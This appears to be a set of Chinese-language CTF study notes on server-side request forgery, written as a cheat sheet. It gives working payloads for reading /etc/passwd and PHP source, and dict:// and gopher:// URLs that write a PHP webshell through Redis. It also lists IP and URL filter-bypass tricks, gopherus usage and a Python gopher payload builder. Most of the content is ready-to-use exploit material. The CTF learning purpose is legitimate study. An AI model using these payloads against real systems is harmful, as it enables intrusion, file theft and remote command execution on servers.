# SSRF整理

## 🎯 漏洞成因

* **函数入口**：
 * `file_get_contents($url)`
 * `fsockopen($host, $port)`
 * `curl_exec($ch)`
* **典型场景**：
 * ?url=http://xxxx
 * 内网访问限制：127.0.0.1/localhost
 * 只允许 http(s)，尝试协议绕过

***

## 🔌 协议利用

### 1. HTTP(S)

* 探测内网 Web 服务 `http://127.0.0.1:8080/flag.php`
* 绕过
 * 0.0.0.0
 * 2130706433 （`ip2long('127.0.0.1')`）
### 2. FILE

* 读取本地文件

```plain
file:///etc/passwd
```

### 3. PHP://FILTER

* 绕过 file:// 黑名单，读取源码 (base64编码)

```plain
php://filter/convert.base64-encode/resource=flag.php
```

### 4. DICT

* 与 TCP 服务通信（但有多余 `CLIENT` 行，不完全可靠）

```plain
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/config:set:dir:/var/www/html
dict://127.0.0.1:6379/config:set:dbfilename:shell.php
dict://127.0.0.1:6379/set:webshell:"<?php system($_GET['cmd']); ?>"
```

### 5. GOPHER

* 任意 TCP Payload，最强利用方式

```plain
gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1%0D%0AHost:127.0.0.1%0D%0A...
```

```
- 记得：**HTTP 协议换行必须 %0D%0A**
- `/_` 后内容要 URL 编码
- 建议写 `Connection: close`，避免服务端保持连接导致响应截断或超时。
```

举例：

#### 一个最小化的 HTTP POST 请求

**注：\r\n不用写出来，只需要换行即可**

原始 HTTP 报文应该是这样（\r\n = 换行 = `%0D%0A`）：

```
`POST /flag.php HTTP/1.1\r\n
Host: 127.0.0.1\r\n
Content-Length: 5\r\n
Content-Type: application/x-www-form-urlencoded\r\n
\r\n
key=a`
```

如果直接放进 gopher://，会被 URL 解析器误解，所以必须转码成：

```
`POST%20/flag.php%20HTTP/1.1%0D%0A
Host:%20127.0.0.1%0D%0A
Content-Length:%205%0D%0A
Content-Type:%20application/x-www-form-urlencoded%0D%0A
%0D%0A
key=a`
```

---

### 3️⃣ 拼接成 gopher:// URL

完整的 payload 就是：

`gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0AContent-Length:%205%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Akey=a`

注意：

所有 **空格 → **`**%20**`

所有 **换行 → **`**%0D%0A**`

`/_` 后面的整个请求都要这样转码

---

### 4️⃣ 小总结

`/_` 之后就是你要发给目标端口的 TCP 原始数据。

因为写在 URL 里 → 必须 URL 编码，否则会歧义。

常见的：空格 `%20`，换行 `%0D%0A`。

---

## 📦 Redis 攻击示例

1. 改存储目录

```plain
CONFIG SET dir /var/www/html
```

2. 改文件名

```plain
CONFIG SET dbfilename shell.php
```

3. 写 Webshell

```plain
set webshell "<?php @eval($_POST['cmd']);?>"
save
```

***

## 🌀 绕过技巧

### 1. URL 编码

* 直接传：编码 1 次
* 参数 ?url= ：编码 2 次
* 遇 302 跳转：解码再转发，可能多次编码

### 2. 换行符

* 标准 HTTP：`%0D%0A` (`\r\n`)
* 特殊场景可用 `%0A` 绕过（非标准）

### 3. IP 绕过

* 十六进制：`0x7f000001`
* 点分十六进制：`0x7f.0x0.0x0.0x1`
* 十进制：`2130706433`
* 八进制：`0177.0.0.1`
* `localhost`
* 短域名：`127.1`

### 4. URL @ 绕过

```plain
http://notfound.ctfhub.com@127.0.0.1/flag.php
```

### 5. 302 跳转绕过

* 黑名单 ban IP
* 利用跳转到白名单 → 再跳本地

***

## 🔍 实战辅助工具

* **dirsearch**: 目录扫描

```plain
python dirsearch.py -u http://test.com -e * -t 1 -w db/ctf.txt
```

* **gopherus**: 一键生成 SSRF payload

```plain
python2 gopherus.py --exploit redis
```

***

## 🚨 注意点

* **dict://** 发包不完全等于原始命令，Redis 推荐 gopher://
* **HTTP 协议必须 \r\n（%0D%0A）**，否则服务端可能拒绝
* **302 不一定是 3+ 次编码**，要看实现逻辑
## URL 前缀校验绕过

题目要求 URL 必须以白名单域名开头时，可尝试：

```text
http://notfound.ctfhub.com@127.0.0.1/flag.php
```

浏览器和部分 HTTP 客户端会把 `@` 前内容当作 userinfo，实际连接到 `127.0.0.1`。

## 302 跳转绕过

- 黑名单只检查第一次请求时，可让白名单地址 302 跳转到内网。
- 跳转层数越多，URL 编码次数可能越多。
- 不要固定假设一定编码 2 次或 3 次，应逐步验证解码结果。

## 过滤 file 时读取文件

```text
php://filter/convert.base64-encode/resource=flag.php
```

`php://filter` 可以绕过后缀或协议黑名单，并避免源码中的特殊字符影响响应。

## gopher 编码脚本

```python
import urllib.parse

payload = """POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 5
Content-Type: application/x-www-form-urlencoded

key=a"""
payload = payload.replace("\n", "\r\n")
encoded = urllib.parse.quote(payload)
result = "gopher://127.0.0.1:80/_" + encoded
print(result)
```

若 URL 还要作为参数传输，需要再次编码。

## 排查顺序

1. 判断 URL 参数是否存在 SSRF。
2. 测试允许的协议与返回差异。
3. 尝试读取本地文件或探测内网端口。
4. 优先使用 `gopher://` 攻击 Redis、FastCGI、MySQL 等 TCP 服务。
5. 确认是否需要二次编码或跳转绕过。
